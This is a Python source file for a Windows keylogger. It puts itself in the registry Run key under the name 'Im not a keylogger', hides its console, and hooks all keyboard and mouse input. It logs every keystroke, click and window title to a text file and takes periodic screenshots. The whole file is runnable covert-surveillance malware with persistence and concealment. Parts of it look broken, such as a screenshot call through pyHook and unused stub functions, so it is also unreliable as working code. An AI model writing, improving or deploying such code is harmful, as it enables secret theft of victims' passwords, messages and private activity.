#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
import time
import random
import string
import win32console
import win32gui
import pythoncom
import pyHook
import winreg

LOG_FILE = 'Logfile.txt'
INTERVAL = 60

class Keylogger:
    def __init__(self):
        self.buffer = ""
        self.pics_names = []
        self.start_time = time.time()

    def add_startup(self):
        fp = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0].split('\\')[-1]
        new_file_path = fp + '\\' + file_name
        key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
        
        try:
            key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key2change, 'Im not a keylogger', 0, winreg.REG_SZ, new_file_path)
            winreg.CloseKey(key2change)
        except Exception as e:
            print(f"Error adding to startup: {e}")

    def hide_console(self):
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

    def generate_name(self):
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))

    def screenshot(self):
        name = self.generate_name()
        self.pics_names.append(name)
        pyHook.ImageGrab.grab().save(name + '.png')

    def is_task_manager_open(self):
        try:
            hwnd = win32gui.FindWindow(None, "Task Manager")
            return hwnd != 0
        except:
            return False

    def log_data(self, data):
        with open(LOG_FILE, 'a') as log_file:
            log_file.write(data)

    def process_event(self, event):
        return f'\n[{time.ctime().split(" ")[3]}] WindowName: {event.WindowName}\n'

    def on_mouse_event(self, event):
        data = self.process_event(event)
        data += f'\tButton: {event.MessageName}\n\tClicked in (Position): {event.Position}\n===================='
        self.buffer += data
        if len(self.buffer) > 300:
            self.screenshot()
        self.check_log_interval()

    def on_keyboard_event(self, event):
        data = self.process_event(event)
        data += f'\tKeyboard key: {event.Key}\n===================='
        self.buffer += data
        self.check_log_interval()

    def check_log_interval(self):
        if len(self.buffer) > 500:
            self.log_data(self.buffer)
            self.buffer = ''

        if int(time.time() - self.start_time) == INTERVAL:
            self.perform_custom_actions()
            self.start_time = time.time()

    def perform_custom_actions(self):
        self.log_data("\n[Custom action performed]\n")

    def terminate_script(self):
        self.log_data("\n[Script terminated]\n")
        sys.exit()

    def start_keylogger(self):
        hook = pyHook.HookManager()
        hook.KeyDown = self.on_keyboard_event
        hook.MouseAllButtonsDown = self.on_mouse_event
        hook.HookKeyboard()
        hook.HookMouse()
        pythoncom.PumpMessages()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.add_startup()
    keylogger.hide_console()
    keylogger.start_keylogger()
